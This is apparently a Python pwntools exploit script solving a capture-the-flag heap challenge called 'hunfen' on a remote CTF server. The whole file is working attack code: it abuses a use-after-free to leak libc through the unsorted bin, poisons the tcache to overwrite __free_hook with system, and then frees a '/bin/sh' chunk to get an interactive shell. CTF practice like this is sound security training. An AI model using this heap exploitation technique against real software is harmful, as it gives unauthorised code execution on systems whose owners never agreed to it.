import sys
from pwn import *

if len(sys.argv) != 2:
	print "sys.argv[1] = r : remote	l : local"
	exit()

#context.log_level = 'debug'

def add(idx, size, content):
	p.sendlineafter('>>', '1')

	p.recv()
	sleep(0.1)
	p.sendline(str(idx))

	p.recv()
	sleep(0.1)
	p.sendline(str(size))

	p.recv()
	sleep(0.1)
	p.sendline(str(content))

def edit(idx, content):
	p.sendlineafter('>>', '2')

	p.recv()
	sleep(0.1)
	p.sendline(str(idx))

	p.recv()
	sleep(0.1)
	p.sendline(str(content))

def delete(idx):
	p.sendlineafter('>>', '3')

	p.recv()
	sleep(0.1)
	p.sendline(str(idx))

def check(idx):
	p.sendlineafter('>>', '4')

	p.recv()
	sleep(0.1)
	p.sendline(str(idx))


if sys.argv[1].strip() == 'l':
	p = process('./hunfen')
elif sys.argv[1].strip() == 'r':
	p = remote('ctf.j0n9hyun.xyz', 3041)

e = ELF('./hunfen')

if sys.argv[1].strip() == 'l':
	l = e.libc
elif sys.argv[1].strip() == 'r':
	l = ELF('./libc-2.27.so')

pause()
### tcahce max bin size : 7
add(0, 1000, 'a')
add(1, 10, 'b')

for i in range(8):
	delete(0)
check(0) # libc leak


libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 96 - 16 - l.sym['__malloc_hook']
log.info('libc : ' + hex(libc))

add(2, 16, 'c')
delete(2)
edit(2, p64(libc + l.sym['__free_hook']))
add(3, 16, 'c')
add(4, 16, p64(libc + l.sym['system'])) # system

add(5, 40, '/bin/sh\x00')
delete(5)


p.interactive()